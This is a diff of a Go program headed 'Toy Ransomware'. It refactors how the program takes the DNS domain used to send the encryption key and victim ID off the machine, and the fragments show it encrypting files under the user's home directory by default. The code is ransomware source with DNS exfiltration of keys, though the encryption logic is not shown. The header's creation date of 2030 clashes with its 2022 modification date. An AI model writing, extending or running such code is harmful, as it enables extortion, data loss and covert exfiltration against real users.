@@ -6,7 +6,7 @@ package main
  * Toy Ransomware
  * By J. Stuart McMurray
  * Created 20300409
- * Last Modified 20221004
+ * Last Modified 20221005
  */
 
 import (
@@ -20,6 +20,10 @@ import (
 	"time"
 
 	"golang.org/x/crypto/nacl/secretbox"
+)
+
+var (
+	domain = "example.com" /* Default DNS domain for key. */
 )
 
 func main() {
@@ -50,17 +54,18 @@ func main() {
 			1024,
 			"Encrypted chunk `size`",
 		)
-		domain = flag.String(
-			"domain",
-			"example.com",
-			"DNS `domain` to which to send key and ID",
-		)
 		root = flag.String(
 			"root",
 			currentHomeDir(),
 			"Root of `directory` tree or single file to encrypt "+
 				"or decrypt",
 		)
+	)
+	flag.StringVar(
+		&domain,
+		"domain",
+		domain,
+		"DNS `domain` to which to send key and ID",
 	)
 	flag.Usage = func() {
 		fmt.Fprintf(
@@ -118,7 +123,7 @@ Options:
 			FileRE:         re,
 		}
 		/* Come up with the key and ID */
-		if ID, e.Key = GenerateKeyAndID(*domain); nil != err {
+		if ID, e.Key = GenerateKeyAndID(domain); nil != err {
 			log.Fatalf("Error generating key and ID: %v", err)
 		}
 
